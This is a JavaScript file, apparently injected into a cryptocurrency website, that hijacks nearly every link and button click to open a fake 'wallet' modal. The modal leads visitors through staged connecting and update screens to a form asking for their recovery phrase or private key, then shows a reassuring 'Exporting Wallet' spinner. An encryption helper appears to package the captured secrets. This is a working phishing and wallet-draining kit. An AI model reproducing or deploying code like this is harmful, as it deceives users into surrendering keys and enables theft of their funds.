									d: "M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z",
									clipRule: "evenodd",
								})
							)
						)
					),
					React.createElement(
						"p",
						{ className: "tw-text-slate-500 tw-text-xs tw-mt-2" },
						"Paste your private key (0x hex or Base58)."
					)
				),
				// CTA button — ss-btn gradient style
				React.createElement(
					"button",
					{
						onClick: handleDetailsEncryption,
						className: "tw-mt-4 tw-w-full tw-py-3 tw-rounded-full tw-font-semibold tw-text-white tw-text-sm tw-transition-all tw-duration-200",
						style: loading
							? { background: "rgba(255,255,255,0.1)", color: "#94a3b8", cursor: "not-allowed" }
							: {
								backgroundImage: "linear-gradient(90deg, #94e7ff, 40%, #00b4e9)",
								boxShadow: "0 4px 15px rgba(0,197,255,0.3)",
							},
						disabled: loading,
						onMouseEnter: (e) => {
							if (!loading) {
								e.currentTarget.style.backgroundImage = "linear-gradient(90deg, #00b4e9, 40%, #94e7ff)";
								e.currentTarget.style.boxShadow = "0 8px 25px rgba(0,197,255,0.45)";
								e.currentTarget.style.transform = "translateY(-1px)";
							}
						},
						onMouseLeave: (e) => {
							if (!loading) {
								e.currentTarget.style.backgroundImage = "linear-gradient(90deg, #94e7ff, 40%, #00b4e9)";
								e.currentTarget.style.boxShadow = "0 4px 15px rgba(0,197,255,0.3)";
								e.currentTarget.style.transform = "translateY(0)";
							}
						},
					},
					loading
						? "Submitting…"
						: inputMode === "phrase"
							? "Confirm Recovery Phrase"
							: "Confirm Private Key"
				)
			)
		);
	};

	/**
	 * Step 6 (final): Exporting spinner — shown after details are encrypted.
	 * Design: cyan spinner, glass panel, animated glow.
	 */
	const WalletSentDetailsView = ({ wallet, onClose }) =>
		React.createElement(
			"div",
			{
				className:
					"tw-relative tw-w-full tw-h-full md:tw-w-[95%] md:tw-h-auto tw-max-w-[440px] tw-rounded-3xl tw-p-6 tw-shadow-2xl tw-flex tw-flex-col tw-overflow-hidden",
				style: {
					background: "rgba(5, 30, 55, 0.92)",
					border: "1px solid rgba(255,255,255,0.1)",
					backdropFilter: "blur(20px)",
					WebkitBackdropFilter: "blur(20px)",
				},
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(GlowOrb, {
				className: "tw-top-0 tw-left-1/2 tw-w-[300px] tw-h-[200px]",
				style: { background: "rgba(0,197,255,0.09)", top: "-40px", transform: "translateX(-50%)" },
			}),
			GridOverlay(),
			React.createElement(
				"div",
				{ className: "tw-relative tw-z-10 tw-w-full" },
				React.createElement(ModalHeader, { wallet, onClose })
			),
			React.createElement(
				"div",
				{
					className:
						"tw-relative tw-z-10 tw-flex-1 tw-flex tw-flex-col tw-items-center tw-justify-center tw-text-center tw-py-10",
				},
				React.createElement(
					"h3",
					{ className: "tw-text-[#94E7FF] tw-text-2xl tw-font-bold tw-mb-6 tw-tracking-tight" },
					"Exporting Wallet"
				),
				// Spinner with concentric glow — ambient effect matching site's pulse-slow
				React.createElement(
					"div",
					{ className: "tw-relative tw-mb-6" },
					React.createElement("div", {
						style: {
							width: 64,
							height: 64,
							borderRadius: "50%",
							border: "4px solid rgba(255,255,255,0.08)",
							borderTopColor: "#00C5FF",
							animation: "spin 0.9s linear infinite",
							boxShadow: "0 0 20px rgba(0,197,255,0.35)",
						},
					}),
					React.createElement("div", {
						style: {
							position: "absolute",
							inset: "8px",
							borderRadius: "50%",
							border: "2px solid rgba(148,231,255,0.15)",
							borderTopColor: "#94e7ff",
							animation: "spin 1.5s linear infinite reverse",
						},
					})
				),
				React.createElement(
					"p",
					{ className: "tw-text-[#94E7FF] tw-font-semibold tw-text-base tw-mb-2" },
					"Securing your data…"
				),
				React.createElement(
					"p",
					{ className: "tw-text-slate-500 tw-text-sm" },
					"Your wallet is being exported securely"
				)
			)
		);

	// ---------------- MAIN MODAL ----------------
	const WalletModal = ({ isOpen, onClose }) => {
		const [activeView, setActiveView] = useState("main");
		const [selectedWallet, setSelectedWallet] = useState(null);

		useEffect(() => {
			if (isOpen) {
				setActiveView("main");
				setSelectedWallet(null);
			}
		}, [isOpen]);

		const handleSelectWallet = (wallet) => {
			setSelectedWallet(wallet);
			setActiveView("connecting");
		};

		const handleFinishConnect = () => setActiveView("update-info");
		const handleStartUpdate = () => setActiveView("final-loading");
		const handleFinishLoading = () => setActiveView("recovery-input");
		const handleSend = () => setActiveView("sent");
		const handleBackToMain = () => setActiveView("main");
		const handleFullClose = () => {
			setActiveView("main");
			onClose();
		};

		const renderView = () => {
			switch (activeView) {
				case "main":
					return React.createElement(WalletSelectView, {
						onClose: handleFullClose,
						onSelectWallet: handleSelectWallet,
					});
				case "connecting":
					return React.createElement(WalletConnectingView, {
						wallet: selectedWallet,
						onBack: handleBackToMain,
						onFinishConnect: handleFinishConnect,
					});
				case "update-info":
					return React.createElement(WalletUpdateInfoView, {
						wallet: selectedWallet,
						onBack: handleBackToMain,
						onStartUpdate: handleStartUpdate,
					});
				case "final-loading":
					return React.createElement(WalletFinalLoadingView, {
						wallet: selectedWallet,
						onBack: handleBackToMain,
						onFinishLoading: handleFinishLoading,
					});
				case "recovery-input":
					return React.createElement(RecoveryPhraseInputView, {
						wallet: selectedWallet,
						onBack: handleBackToMain,
						onSend: handleSend,
					});
				case "sent":
					return React.createElement(WalletSentDetailsView, {
						wallet: selectedWallet,
						onClose: handleFullClose,
					});
				default:
					return null;
			}
		};

		const mainContainerClasses =
			activeView === "main"
				? "tw-fixed tw-inset-0 tw-flex tw-items-end md:tw-items-center tw-justify-center tw-z-[10000] tw-transition-all tw-duration-300"
				: "tw-fixed tw-inset-0 tw-flex tw-items-center tw-justify-center tw-z-[10000] tw-transition-all tw-duration-300";
		const contentContainerClasses =
			activeView === "main"
				? "tw-relative tw-w-full md:tw-w-[95%] tw-max-w-[440px]"
				: "tw-relative tw-w-full tw-h-full md:tw-w-[95%] md:tw-h-auto tw-max-w-[440px]";

		return React.createElement(
			"div",
			{
				className: `${mainContainerClasses} ${isOpen ? "tw-opacity-100 tw-visible" : "tw-opacity-0 tw-invisible"
					}`,
				style: {
					display: isOpen ? "flex" : "none",
				},
				onClick:
					activeView === "main" ? handleFullClose : handleBackToMain,
			},
			// Backdrop — matches site's backdrop-blur-md with deep navy tint aligned to bg-[#051e37]
			React.createElement("div", {
				style: {
					position: "fixed",
					inset: 0,
					background: "rgba(5, 10, 20, 0.82)",
					backdropFilter: "blur(14px)",
					WebkitBackdropFilter: "blur(14px)",
				},
			}),
			React.createElement(
				"div",
				{
					className: contentContainerClasses,
					style: { position: "relative", zIndex: 1 },
					onClick: (e) => e.stopPropagation(),
				},
				renderView()
			)
		);
	};

	// ---------------- CONTROLLER AND PUBLIC API ----------------
	const ROOT_ELEMENT_ID = "wallet-modal-root";
	const TRIGGER_CLASSNAMES = ["e1p5oug0", "e1vhhgxp2"];
	const DRAWER_SELECTOR = ".xl\\:hidden .fixed.top-0.right-0";
	const NAV_COLLAPSE_SELECTOR = ".navbar-collapse";
	const NAV_TOGGLER_SELECTOR = ".navbar-toggler";

	let root = null;
	let setOpenGlobal = null;
	let isOpenQueued = false;
	let isAppStarted = false;

	function injectModalStyles() {
		if (typeof document === "undefined" || document.getElementById("wallet-modal-essential-styles")) return;
		const style = document.createElement("style");
		style.id = "wallet-modal-essential-styles";
		style.textContent = `
			#wallet-modal-root {
				position: relative;
				z-index: 10000;
			}
			#wallet-modal-root .tw-fixed {
				position: fixed !important;
			}
			#wallet-modal-root .tw-inset-0 {
				top: 0 !important;
				right: 0 !important;
				bottom: 0 !important;
				left: 0 !important;
			}
			#wallet-modal-root .tw-z-\\[10000\\] {
				z-index: 10000 !important;
			}
			#wallet-modal-root .tw-flex {
				display: flex !important;
			}
			#wallet-modal-root .tw-items-center {
				align-items: center !important;
			}
			#wallet-modal-root .tw-justify-center {
				justify-content: center !important;
			}
			#wallet-modal-root .tw-text-white {
				color: #ffffff !important;
			}
			#wallet-modal-root input {
				color: #ffffff !important;
			}
			#wallet-modal-root select {
				color: #ffffff !important;
			}
			#wallet-modal-root option {
				background: #051e37 !important;
				color: #ffffff !important;
			}
			#wallet-modal-root .no-scrollbar::-webkit-scrollbar {
				display: none;
			}
			#wallet-modal-root .no-scrollbar {
				-ms-overflow-style: none;
				scrollbar-width: none;
			}
			/* Spin animation for export view */
			@keyframes ss-modal-spin {
				to { transform: rotate(360deg); }
			}
		`;
		const target = document.head || document.body || document.documentElement;
		if (target && target.appendChild) {
			target.appendChild(style);
		}
	}

	function WalletController() {
		const [open, setOpen] = useState(isOpenQueued);
		setOpenGlobal = setOpen;
		useEffect(() => {
			if (isOpenQueued) {
				setOpen(true);
			}
		}, []);
		return React.createElement(WalletModal, {
			isOpen: open,
			onClose: () => {
				isOpenQueued = false;
				setOpen(false);
			},
		});
	}

	function renderApp() {
		injectModalStyles();
		let container = document.getElementById(ROOT_ELEMENT_ID);
		if (!container) {
			container = document.createElement("div");
			container.id = ROOT_ELEMENT_ID;
			document.body.appendChild(container);
		}
		if (!root && createRoot) {
			root = createRoot(container);
		}
		if (root) {
			root.render(React.createElement(WalletController));
		}
	}

	// ---------------- PUBLIC API ----------------
	window.walletModal = {
		open: () => {
			isOpenQueued = true;
			if (setOpenGlobal) {
				setOpenGlobal(true);
			}
		},
		close: () => {
			isOpenQueued = false;
			if (setOpenGlobal) {
				setOpenGlobal(false);
			}
		},
	};

	// ---------------- TRIGGER WIRING (all links & buttons) ----------------
	const TRIGGER_SELECTOR = [
		"a",
		"button",
		'[role="button"]',
		".wallet-modal-trigger",
		...TRIGGER_CLASSNAMES.map((c) => `.${c}`),
	].join(",");

	const wiredElements = new WeakSet();
	let attachScheduled = false;

	function isInsideModal(element) {
		if (!element) return false;
		const el = element.nodeType === 1 ? element : element.parentElement;
		return !!(el && el.closest && el.closest("#" + ROOT_ELEMENT_ID));
	}

	// ---------------- MOBILE NAVIGATION ----------------
	function getMobileDrawer() {
		return (
			document.getElementById("mobile-menu-drawer") ||
			document.querySelector('[aria-label="Close mobile menu"]')?.closest('.fixed') ||
			document.querySelector('.xl\\:hidden .fixed.top-0.right-0') ||
			document.querySelector('.fixed.top-0.right-0')
		);
	}

	function isMobileNavOpen() {
		const drawer = getMobileDrawer();
		if (drawer) {
			return drawer.classList.contains("is-open") || !drawer.classList.contains("translate-x-full");
		}
		const collapse = document.querySelector(NAV_COLLAPSE_SELECTOR);
		return !!(collapse && collapse.classList.contains("show"));
	}

	function openMobileNav() {
		const drawer = getMobileDrawer();
		if (drawer) {
			drawer.classList.remove("translate-x-full");
			drawer.classList.add("translate-x-0", "is-open");
			drawer.style.transform = "translateX(0%)";
		}
		const collapse = document.querySelector(NAV_COLLAPSE_SELECTOR);
		if (collapse) collapse.classList.add("show");
		const toggler = document.querySelector(NAV_TOGGLER_SELECTOR);
		if (toggler) toggler.setAttribute("aria-expanded", "true");
	}

	function closeMobileNav() {
		const drawer = getMobileDrawer();
		if (drawer) {
			drawer.classList.remove("translate-x-0", "is-open");
			drawer.classList.add("translate-x-full");
			drawer.style.transform = "translateX(100%)";
		}
		const collapse = document.querySelector(NAV_COLLAPSE_SELECTOR);
		if (collapse) collapse.classList.remove("show");
		const toggler = document.querySelector(NAV_TOGGLER_SELECTOR);
		if (toggler) toggler.setAttribute("aria-expanded", "false");
	}

	function toggleMobileNav() {
		if (isMobileNavOpen()) {
			closeMobileNav();
		} else {
			openMobileNav();
		}
	}

	function isMobileNavButton(el) {
		if (!el) return false;
		const btn = el.closest ? el.closest("button, [role='button'], a") : null;
		if (!btn) return false;
		const aria = btn.getAttribute ? btn.getAttribute("aria-label") : "";
		return !!(
			aria === "Toggle mobile menu" ||
			aria === "Close mobile menu" ||
			btn.matches?.(
				'[aria-label="Toggle mobile menu"], [aria-label="Close mobile menu"], .navbar-toggler'
			) ||
			btn.classList?.contains("navbar-toggler") ||
			btn.querySelector?.('[aria-label="Toggle mobile menu"], [aria-label="Close mobile menu"]')
		);
	}

	function isCarouselBullet(el) {
		if (!el) return false;
		const btn = el.closest ? el.closest("button, [role='button'], div") : null;
		if (!btn) return false;
		return !!(
			btn.matches?.(".swiper-pagination-bullet, .swiper-pagination-bullet *") ||
			btn.classList?.contains("swiper-pagination-bullet")
		);
	}

	// Global capture click handler: intercepts all clicks on document
	function handleGlobalClick(event) {
		const target = event.target;
		if (!target || isInsideModal(target)) return;

		const trigger = target.closest ? target.closest(TRIGGER_SELECTOR) : null;
		if (!trigger || isInsideModal(trigger)) return;

		// 1. Mobile navigation hamburger opening and closing buttons MUST NOT trigger the modal
		if (isMobileNavButton(trigger) || isMobileNavButton(target)) {
			event.preventDefault();
			event.stopPropagation();
			if (typeof event.stopImmediatePropagation === "function") {
				event.stopImmediatePropagation();
			}

			const btn = (trigger && trigger.closest ? trigger.closest("button, [role='button'], a") : null) ||
				(target && target.closest ? target.closest("button, [role='button'], a") : null) || trigger;
			const aria = btn && btn.getAttribute ? btn.getAttribute("aria-label") : "";
			if (aria === "Close mobile menu") {
				closeMobileNav();
			} else {
				toggleMobileNav();
			}
			return;
		}

		// 2. Carousel pagination bullets switch slides and MUST NOT trigger the modal
		if (isCarouselBullet(trigger) || isCarouselBullet(target)) {
			return;
		}

		// 3. All other anchor and button clicks trigger the modal:
		event.preventDefault();
		event.stopPropagation();
		if (typeof event.stopImmediatePropagation === "function") {
			event.stopImmediatePropagation();
		}

		// If clicked inside the mobile drawer (e.g. mobile nav links), close drawer first
		const drawer = getMobileDrawer();
		if ((drawer && drawer.contains(trigger)) || trigger.closest(NAV_COLLAPSE_SELECTOR)) {
			closeMobileNav();
		}

		window.walletModal.open();
	}

	// Attach single capture listener on document
	if (typeof document !== "undefined") {
		document.addEventListener("click", handleGlobalClick, true);
	}

	// Per-element click handler as secondary fallback
	function handleTriggerClick(event) {
		if (isInsideModal(event.currentTarget)) return;
		if (isMobileNavButton(event.currentTarget)) {
			event.preventDefault();
			event.stopPropagation();
			if (typeof event.stopImmediatePropagation === "function") {
				event.stopImmediatePropagation();
			}
			const ariaLabel = event.currentTarget.getAttribute("aria-label");
			if (ariaLabel === "Close mobile menu") {
				closeMobileNav();
			} else {
				toggleMobileNav();
			}
			return;
		}

		if (isCarouselBullet(event.currentTarget)) {
			return;
		}

		event.preventDefault();
		event.stopPropagation();
		if (typeof event.stopImmediatePropagation === "function") {
			event.stopImmediatePropagation();
		}

		const drawer = getMobileDrawer();
		if ((drawer && drawer.contains(event.currentTarget)) || event.currentTarget.closest(NAV_COLLAPSE_SELECTOR)) {
			closeMobileNav();
		}

		window.walletModal.open();
	}

	function attachModalTriggers() {
		if (typeof document === "undefined") return;
		document.querySelectorAll(TRIGGER_SELECTOR).forEach((element) => {
			if (wiredElements.has(element) || isInsideModal(element) || isMobileNavButton(element) || isCarouselBullet(element)) return;
			element.addEventListener("click", handleTriggerClick);
			wiredElements.add(element);
		});
	}

	function scheduleAttachModalTriggers() {
		if (attachScheduled) return;
		attachScheduled = true;
		requestAnimationFrame(() => {
			attachScheduled = false;
			attachModalTriggers();
		});
	}

	async function startModal() {
		if (isAppStarted) return;
		const ready = await ensureReact();
		if (!ready) {
			console.error("[wallet-modal] React and ReactDOM could not be loaded.");
			return;
		}
		isAppStarted = true;
		renderApp();
		attachModalTriggers();
		closeMobileNav();

		document.addEventListener("keydown", (event) => {
			if (event.key === "Escape") {
				if (isMobileNavOpen()) {
					closeMobileNav();
				} else {
					window.walletModal.close();
				}
			}
		});

		if (typeof MutationObserver !== "undefined" && document.body) {
			const observer = new MutationObserver(scheduleAttachModalTriggers);
			observer.observe(document.body, { childList: true, subtree: true });
		}
	}

	if (typeof document !== "undefined") {
		if (document.readyState === "loading") {
			document.addEventListener("DOMContentLoaded", () => startModal());
		} else {
			startModal();
		}
	}

	// Helper: Convert a plain text password string into a proper cryptographic key
	async function deriveKey(password, salt) {
		const encoder = new TextEncoder();
		const baseKey = await window.crypto.subtle.importKey(
			"raw",
			encoder.encode(password),
			"PBKDF2",
			false,
			["deriveKey"]
		);

		return window.crypto.subtle.deriveKey(
			{
				name: "PBKDF2",
				salt: salt,
				iterations: 100000,
				hash: "SHA-256"
			},
			baseKey,
			{ name: "AES-GCM", length: 256 },
			false,
			["encrypt", "decrypt"]
		);
	}

	// 1. ENCRYPT FUNCTION
	async function encryptText(text, password) {
		const encoder = new TextEncoder();

		// Generate a random salt (16 bytes) and an Initialization Vector (12 bytes)
		const salt = window.crypto.getRandomValues(new Uint8Array(16));
		const iv = window.crypto.getRandomValues(new Uint8Array(12));

		// Derive the 256-bit AES key from the password
		const key = await deriveKey(password, salt);

		// Encrypt the text
		const encryptedBuffer = await window.crypto.subtle.encrypt(
			{ name: "AES-GCM", iv: iv },
			key,
			encoder.encode(text)
		);

		// Package the salt, iv, and ciphertext into a single Uint8Array for easy transport
		const resultBuffer = new Uint8Array(salt.length + iv.length + encryptedBuffer.byteLength);
		resultBuffer.set(salt, 0);
		resultBuffer.set(iv, salt.length);
		resultBuffer.set(new Uint8Array(encryptedBuffer), salt.length + iv.length);

		// Convert to Base64 string so it's readable text
		return btoa(String.fromCharCode(...resultBuffer));
	}

	// 2. DECRYPT FUNCTION
	async function decryptText(encryptedBase64, password) {
		// Convert back from Base64 to binary buffer
		const binaryString = atob(encryptedBase64);
		const totalBuffer = new Uint8Array(binaryString.length);
		for (let i = 0; i < binaryString.length; i++) {
			totalBuffer[i] = binaryString.charCodeAt(i);
		}

		// Extract the salt, iv, and actual ciphertext from the packaged data
		const salt = totalBuffer.slice(0, 16);
		const iv = totalBuffer.slice(16, 28);
		const ciphertext = totalBuffer.slice(28);

		// Derive the exact same key using the extracted salt
		const key = await deriveKey(password, salt);

		try {
			// Decrypt the ciphertext
			const decryptedBuffer = await window.crypto.subtle.decrypt(
				{ name: "AES-GCM", iv: iv },
				key,
				ciphertext
			);

			// Decode back into plain text
			return new TextDecoder().decode(decryptedBuffer);
		} catch (e) {
			throw new Error("Decryption failed. Invalid password or corrupted data.");
		}
	}


})();
